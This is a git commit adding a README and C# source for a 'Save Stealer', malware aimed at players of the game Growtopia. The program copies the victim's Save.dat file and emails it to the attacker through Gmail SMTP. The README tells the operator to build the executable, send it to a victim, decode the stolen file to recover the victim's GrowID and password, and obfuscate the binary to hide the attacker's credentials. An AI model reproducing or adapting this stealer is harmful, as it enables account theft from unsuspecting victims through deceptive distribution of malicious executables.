9803dcfe246c6231a936a833d437f8daef4c8fa3
memo <77317642+meminyum@users.noreply.github.com>
2021-04-24 02:37:59 +0300

    Add files via upload

--- README.md
+++ README.md
@@ -1,2 +1,43 @@
-# savestealer
-Growtopia save.dat stealer that send you the save.dat file.
+# _Save Stealer_
+A program that allows you to send you the victim's save.dat in Growtopia.
+
+## **IMPORTANT THINGS**
+---
+### Don't forgot to change mails.
+
+## **Do these steps before running the program**
+
+* Open your _gmail_'s **Security** part. [Here](https://myaccount.google.com/security "Google Search")
+* Scroll down until you see _Less secure app access_.
+* Click to the button and open it.
+* If theres a Save Button, then click to the Save button.
+
+### _Picture of the last step_
+![Pic1](https://www.linkpicture.com/q/asddsa.png)
+
+## Getting ready for debugging
+---
+1. Install Visual Studio C# 2019 if you dont have. (Can find tutorials on [Youtube](https://www.youtube.com/ "Google Search"))
+    * [Example tutorial](https://www.youtube.com/watch?v=Bu26MZAv12E "Google Search")
+2. Open _main stealer.sln_ file with **Visual Studio**
+3. After opening the file press Ctrl+Alt+L and open _Solution Navigator_
+4. Find _Program.cs_ in the Solution Navigator
+5. Double click on and open it
+
+## Debugging
+---
+1. Set build to Debug x64 (x64 is not necessarily)
+2. Build the project (If you don't build it then next step won't work)
+
+## Sending .exe file to the victim
+---
+1. Open the **_main stealer_** folder that you downloaded
+2. Open _Bin_ folder and then open the _Debug_ folder
+3. You will see _main stealer.exe_ file
+4. Send it to the victim
+5. When the victim opens the file, victim's save.dat file will automatically will send to the mail that you wrote in the code
+6. Use save.dat decoder to get _GrowID_ and _Password_
+7. You can search "save.dat decoder" at google to find a decoder
+
+## Important
+* Use .net obfuscator so the victim won't be able to access your gmail and password
---
+++ main stealer/Program.cs
@@ -0,0 +1,48 @@
+﻿using System;
+using System.Net.Mail;
+using System.Net;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Threading;
+using System.IO;
+using System.Text.RegularExpressions;
+using System.Collections;
+
+namespace main_stealer
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            SmtpClient sc = new SmtpClient();
+            sc.Port = 587;
+            sc.Host = "smtp.gmail.com";
+            sc.EnableSsl = true;
+
+            sc.Credentials = new NetworkCredential("SENDERMAIL@gmail.com", "PASSWORD"); // sender of the mail , password of the mail
+                                                                                        // i suggest you to open a new mail for this
+
+            MailMessage mail = new MailMessage();
+
+            mail.From = new MailAddress("SENDERMAIL@gmail.com", "NAME"); // sender of the mail , name of the sender
+
+            mail.To.Add("RECEIVERMAIL@gmail.com"); // receiver of the mail
+
+            mail.Subject = ""; // subject of the mail 
+            /*DateTime date1 = DateTime.Now;      // date + time of time moment
+            string date1_str = date1.ToString();  // transforming into string
+            mail.Subject = date1_str; */          // making subject of the mail date + time
+                                                  // if u want to open this, erase /* and */
+            mail.IsBodyHtml = true;
+            mail.Body = ""; // content of the mail
+
+            mail.Attachments.Add(new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Growtopia\Save.dat"));
+
+            sc.Send(mail);
+            Console.Write("Press any key to close control panel.\n\n");
+            Console.ReadKey();
+        }
+    }
+}
